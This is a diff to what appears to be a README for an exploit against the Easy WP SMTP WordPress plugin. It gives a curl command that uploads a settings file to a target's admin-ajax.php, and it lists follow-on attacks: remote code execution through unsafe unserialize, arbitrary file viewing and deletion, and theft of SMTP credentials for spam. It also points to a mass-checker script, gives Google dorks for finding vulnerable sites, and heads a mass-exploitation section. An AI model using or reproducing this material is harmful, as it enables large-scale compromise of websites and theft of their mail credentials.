@@ -16,15 +16,22 @@ In the following proof of concept, Its going to use swpsmtp_import_settings to u
 
 >$ curl https://TARGET.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'
 
+Other vulnerabilities could be exploited such as:
+
+Remote Code Execution via PHP Object Injection because Easy WP SMTP makes use of unsafe unserialize() calls.
+Viewing/deleting the log (or any file, since hackers can change the log filename).
+Exporting the plugin configuration which includes the SMTP host, username and password and using it to send spam emails.
+
 3. For mass-checker vuln site list:
 
 > Use my python script: python script.py list.txt & dont forget to install libraries (pip install module).
 
+
 4. Some GOOGLE DORKS:
 
->inurl:'/wp-content/plugins/easy-wp-smtp/'
->intext:'Index of /wp-content/plugins/easy-wp-smtp'
->intext:'=== Easy WP SMTP ==='
+DORK 1 | DORK 2 | DORK 3
+------------ | ------------- | -------------
+inurl:'/wp-content/plugins/easy-wp-smtp/' | intext:'Index of /wp-content/plugins/easy-wp-smtp' | intext:'=== Easy WP SMTP ==='
 
 5. Mass exploiting python script:
 
